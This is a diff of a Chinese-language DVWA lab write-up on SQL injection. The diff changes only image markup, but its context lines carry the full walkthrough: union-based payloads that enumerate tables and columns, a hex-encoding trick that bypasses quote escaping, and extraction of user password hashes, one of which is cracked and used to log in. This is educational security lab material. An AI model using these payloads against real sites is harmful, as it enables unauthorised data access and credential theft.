@@ -32,7 +32,7 @@ SQL 注入攻击是利用是指利用设计上的漏洞，在目标服务器上�
 
 ## SQL注入原理
 
-![](../assets/images/posts/dvwa/sql/sql.png)
+<img src="/assets/images/posts/dvwa/sql/sql.png">
 
 SQL 注入能使攻击者绕过认证机制，完全控制远程服务器上的数据库。 SQL 是结构化查询语言的简称，它是访问数据库的事实标准。目前，大多数 Web 应用都使用 SQL 数据库来存放应用程序的数据。几乎所有的 Web 应用在后台 都使用某种 SQL 数据库。跟大多数语言一样，SQL 语法允许数据库命令和用户数据混杂在一起的。如果开发人员不细心的话，用户数据就有可能被解释成命令， 这样的话，远程用户就不仅能向 Web 应用输入数据，而且还可以在数据库上执行任意命令了。
 
@@ -73,67 +73,67 @@ SQL 注入式攻击的主要形式有两种。一是直接将代码插入到与 
    当输入的参数为字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。
 
 抓包更改参数为`1' and 1=1`,返回报错
-![](../assets/images/posts/dvwa/sql/1.png)
+<img src="/assets/images/posts/dvwa/sql/1.png">
 
 
 抓包更改参数为`1 and 1=1`,查询成功
-![](../assets/images/posts/dvwa/sql/2.png)
+<img src="/assets/images/posts/dvwa/sql/2.png">
 
 所以判断出注入类型为数字型注入，由于是数字型注入，服务器端的`mysql_real_escape_string`函数就形同虚设了，因为数字型注入并不需要借助引号.
 
 ### 2. 猜SQL查询语句的字段数
 
 抓包更改参数为`1 order by 2`,查询成功
-![](../assets/images/posts/dvwa/sql/3.png)
+<img src="/assets/images/posts/dvwa/sql/3.png">
 
 抓包更改参数为`1 order by 3`,查询失败
-![](../assets/images/posts/dvwa/sql/4.png)
+<img src="/assets/images/posts/dvwa/sql/4.png">
 
 由此可判断出SQL查询语句中只有两个字段.
 
 ### 3. 确定显示字段的顺序
 
 抓包更改参数为`1 union select 1,2`,查询成功
-![](../assets/images/posts/dvwa/sql/5.png)
+<img src="/assets/images/posts/dvwa/sql/5.png">
 
 ### 4. 获取当前的数据库名
 
 抓包更改参数为`1 union select 1,database()`,查询成功
-![](../assets/images/posts/dvwa/sql/6.png)
+<img src="/assets/images/posts/dvwa/sql/6.png">
 
 当前数据库名为dvwa
 
 ### 5. 获取数据库中的表
 
 抓包更改参数为`1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()`,查询成功
-![](../assets/images/posts/dvwa/sql/7.png)
+<img src="/assets/images/posts/dvwa/sql/7.png">
 
 数据库中存在两个表，分别为guestbook和users
 
 ### 6. 获取users表中的字段名
 
 抓包更改参数为`1 union select 1,group_concat(column_name) from information_schema.columns where table_name=‘users’`,查询失败
-![](../assets/images/posts/dvwa/sql/8.png)
+<img src="/assets/images/posts/dvwa/sql/8.png">
 
 > 这是因为`'`在这里被转义成了`\'`，我们把`users`转为16进制绕过
 
 抓包更改参数为`1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273`,查询成功
-![](../assets/images/posts/dvwa/sql/9.png)
+<img src="/assets/images/posts/dvwa/sql/9.png">
 
 ### 7. 获取users表中的用户名和密码
 
 抓包更改参数为`1 union select user,password from users`,查询成功
-![](../assets/images/posts/dvwa/sql/10.png)
+<img src="/assets/images/posts/dvwa/sql/10.png">
 
 在这里我们把Firstname为`smithy`对应的Surname解md5
 
-![](../assets/images/posts/dvwa/sql/11.png)
+<img src="/assets/images/posts/dvwa/sql/11.png">
 
 得到用户名为`smithy`对应的密码为`password`
 
 并在dvwa中用smithy登录，下图为用`smithy`账户登录成功的截图。
 
-![](../assets/images/posts/dvwa/sql/12.png)
+<img src="/assets/images/posts/dvwa/sql/12.png">
 
 ### 源码分析
 
